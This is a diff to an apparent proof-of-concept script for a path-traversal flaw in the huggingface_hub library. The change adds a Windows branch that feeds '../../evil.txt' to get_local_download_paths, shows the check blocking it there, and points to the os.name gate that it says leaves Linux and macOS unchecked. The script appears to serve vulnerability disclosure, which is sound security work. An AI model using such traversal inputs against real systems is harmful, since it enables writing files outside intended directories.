@@ -59,13 +59,28 @@ def info(msg):
 # ─── Precondition check ─────────────────────────────────────────────────────
 header("VULN-001 PoC: Path Traversal on Unix")
 
-info(f"Platform: {os.name} ({os.uname().sysname} {os.uname().release})")
+import platform
+info(f"Platform: {os.name} ({platform.system()} {platform.release()})")
 info(f"Python:   {sys.version.split()[0]}")
 
 if os.name == "nt":
-    print(f"\n  {RED}This vulnerability only affects Unix (Linux/macOS).{RESET}")
-    print(f"  On Windows, the validation IS present and blocks '..' sequences.")
-    sys.exit(1)
+    print(f"\n  {YELLOW}NOTE: You are on Windows. The '..' validation IS present on Windows.")
+    print(f"  This vulnerability only affects Linux/macOS where the check is skipped.")
+    print(f"  The PoC will now demonstrate that Windows correctly BLOCKS the traversal,")
+    print(f"  proving the fix exists but is gated behind os.name == 'nt'.{RESET}\n")
+
+    from huggingface_hub._local_folder import get_local_download_paths
+    info("Calling: get_local_download_paths(Path('C:/tmp/safe'), '../../evil.txt')")
+    try:
+        paths = get_local_download_paths(Path("C:/tmp/safe"), "../../evil.txt")
+        vuln(f"file_path: {paths.file_path} — Windows is ALSO vulnerable!")
+    except ValueError as e:
+        ok(f"BLOCKED on Windows: {e}")
+        print(f"\n  {GREEN}Windows is safe. But Linux/macOS skip this exact check.{RESET}")
+        print(f"  The vulnerable code in _local_folder.py:211:")
+        print(f"    {RED}if os.name == \"nt\":{RESET}  # <-- this means Linux/macOS NEVER validate")
+        print(f"        if sanitized_filename.startswith(\"..\\\\\") ...")
+    sys.exit(0)
 
 ok("Running on Unix — the vulnerable code path is active\n")
 
